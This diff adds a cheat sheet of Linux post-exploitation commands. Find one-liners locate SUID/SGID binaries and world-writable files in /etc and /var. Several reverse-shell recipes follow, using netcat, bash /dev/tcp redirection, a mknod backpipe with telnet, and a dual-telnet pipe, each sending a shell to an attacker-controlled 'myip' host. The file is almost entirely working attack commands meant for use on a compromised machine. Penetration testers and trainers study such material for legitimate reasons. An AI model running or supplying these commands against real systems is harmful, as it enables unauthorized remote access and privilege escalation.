@@ -1,0 +1,41 @@
+#suid programs
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null >suidfiles.txt
+
+#list suid programs owned by root
+find / -type f  -user root \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; 2>/dev/null >suidfiles.txt
+
+#find world writeable files in /etc
+find /etc/ -type f -perm -o=w
+
+#find world writeable files in /var
+find /var/ -type f -perm -o=w
+
+#find log files you can read
+find /var/log/ -type f -perm -o=r
+
+#Reverse Shell Interaction with NetCat
+
+#When shelled in to the remote host, simply issue the following command to send the shell back home:
+nc -c /bin/bash <myip> 1234
+
+#Unix-ish nc that does support the -c flag
+/bin/sh -i 2>&1 | nc myip 1234
+
+#You could even pipe BASH through netcat.
+/bin/bash | nc <myip> 1234
+
+#Then listen for the shell:
+nc -l -p 1234 -vvv
+
+#Reverse Shell w/o NetCat
+
+/bin/bash -i > /dev/tcp/myip/1234 0<&1 2>&1
+
+#OR
+
+mknod backpipe P && telnet myip 1234 0<backpipe | /bin/bash 1>backpipe
+
+#even crazier
+#listen on port 1234 and 12345
+telnet myip 1234 | /bin/bash | telnet myip 12345
+#issue commands in 1234 shell and get response in 12345 shell
